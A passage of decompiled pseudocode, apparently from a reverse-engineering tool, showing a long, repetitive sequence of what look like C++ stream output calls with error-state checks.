0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar16, unaff_EDI, unaff_EBP, unaff_ESI, unaff_EBX, noname_6, \n                              unaff_retaddr, param_1, param_2, param_3, param_4);\n        uVar15 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar16, unaff_EDI, unaff_EBP, unaff_ESI, unaff_EBX, noname_6, \n                              unaff_retaddr, param_1, param_2, param_3);\n        uVar14 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar15, uVar16, unaff_EDI, unaff_EBP, unaff_ESI, unaff_EBX, \n                              noname_6, unaff_retaddr, param_1, param_2);\n        uVar13 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar14, uVar15, uVar16, unaff_EDI, unaff_EBP, unaff_ESI, \n                              unaff_EBX, noname_6, unaff_retaddr, param_1);\n        uVar12 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar13, uVar14, uVar15, uVar16, unaff_EDI, unaff_EBP, \n                              unaff_ESI, unaff_EBX, noname_6, unaff_retaddr);\n        uVar11 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, unaff_EDI, unaff_EBP, \n                              unaff_ESI, unaff_EBX, noname_6);\n        uVar10 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, unaff_EDI, \n                              unaff_EBP, unaff_ESI, unaff_EBX);\n        uVar9 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, \n                              unaff_EDI, unaff_EBP, unaff_ESI);\n        uVar8 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, \n                              unaff_EDI, unaff_EBP);\n        uVar7 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, \n                              uVar16, unaff_EDI);\n        uVar6 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, \n                              uVar15, uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, \n                              uVar14, uVar15);\n        uVar15 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, \n                              uVar13, uVar14);\n        uVar14 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, \n                              uVar12, uVar13);\n        uVar13 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, \n                              uVar11, uVar12);\n        uVar12 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, \n                              uVar10, uVar11);\n        uVar11 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, \n                              uVar9, uVar10);\n        uVar10 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, \n                              uVar8, uVar9);\n        uVar9 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, uVar6, \n                              uVar7, uVar8);\n        uVar8 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, \n                              uVar6, uVar7);\n        uVar7 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, \n                              uVar16, uVar6);\n        uVar6 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, \n                              uVar15, uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, \n                              uVar14, uVar15);\n        uVar15 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, \n                              uVar13, uVar14);\n        uVar14 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, \n                              uVar12, uVar13);\n        uVar13 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, \n                              uVar11, uVar12);\n        uVar12 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar12, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, \n                              uVar10, uVar11);\n        uVar11 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, \n                              uVar9, uVar10);\n        uVar10 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, \n                              uVar8, uVar9);\n        uVar9 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, uVar6, \n                              uVar7, uVar8);\n        uVar8 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, uVar16, \n                              uVar6, uVar7);\n        uVar7 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, uVar15, \n                              uVar16, uVar6);\n        uVar6 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, uVar14, \n                              uVar15, uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, uVar13, \n                              uVar14, uVar15);\n        uVar15 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, uVar12, \n                              uVar13, uVar14);\n        uVar14 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        piVar2 = fcn.0040117c(0x442798, 0x4230c8, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, \n                              uVar12, uVar13);\n        uVar13 = 10;\n        fcn.004011fe();\n        uVar4 = 0;\n        if (((*(*(*piVar2 + 4) + 8 + piVar2) & 6) == 0) &&\n           (iVar3 = (**(**(piVar2 + *(*piVar2 + 4) + 0x28) + 0x2c))(),  iVar3 == -1)) {\n            uVar4 = 4;\n        }\n        if (uVar4 != 0) {\n            uVar4 = *(piVar2 + *(*piVar2 + 4) + 8) | uVar4;\n            if (*(piVar2 + *(*piVar2 + 4) + 0x28) == 0) {\n                uVar4 = uVar4 | 4;\n            }\n            fcn.0040888d(uVar4, 0);\n        }\n        fcn.0040117c(0x442798, 0x4230c8, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10, uVar11, \n                     uVar12);\n        noname_2_04 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, noname_2_04, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9, uVar10\n                     , uVar11);\n        uVar12 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar12, noname_2_04, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7, uVar8, uVar9\n                     , uVar10);\n        noname_2_03 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, noname_2_03, uVar12, noname_2_04, uVar13, uVar14, uVar15, uVar16, uVar6, uVar7\n                     , uVar8, uVar9);\n        noname_2_02 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, noname_2_02, noname_2_03, uVar12, noname_2_04, uVar13, uVar14, uVar15, uVar16, \n                     uVar6, uVar7, uVar8);\n        noname_2_01 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, noname_2_01, noname_2_02, noname_2_03, uVar12, noname_2_04, uVar13, uVar14, \n                     uVar15, uVar16, uVar6, uVar7);\n        noname_2_00 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, noname_2_00, noname_2_01, noname_2_02, noname_2_03, uVar12, noname_2_04, uVar13\n                     , uVar14, uVar15, uVar16, uVar6);\n        noname_2 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, noname_2, noname_2_00, noname_2_01, noname_2_02, noname_2_03, uVar12, \n                     noname_2_04, uVar13, uVar14, uVar15, uVar16);\n        uVar16 = 10;\n        fcn.004011fe();\n        fcn.0040119a();\n        fcn.0040117c(0x442798, 0x4230c8, uVar16, noname_2, noname_2_00, noname_2_01, noname_2_02, noname_2_03, uVar12, \n                     noname_2_04, uVar13, uVar14, uVar15);\n     